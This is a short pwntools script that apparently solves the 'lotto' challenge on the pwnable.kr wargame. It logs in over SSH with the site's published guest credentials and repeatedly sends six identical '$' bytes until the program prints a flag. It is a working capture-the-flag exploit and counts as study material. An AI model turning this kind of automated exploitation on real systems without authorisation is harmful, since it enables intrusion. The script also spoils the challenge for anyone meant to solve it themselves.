#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

HOST = "pwnable.kr"
PORT = 2222
USER = "lotto"
PASS = "guest"

connectionHandle = ssh(host=HOST, port=PORT, user=USER, password=PASS)
processHandle = connectionHandle.process(executable="./lotto", argv=["./lotto"])

flag = ""
while 1:
	processHandle.sendline("1\n$$$$$$")
	flag = processHandle.recv(1024)
	if "mom" in flag:
		print(flag)
		break

connectionHandle.close()
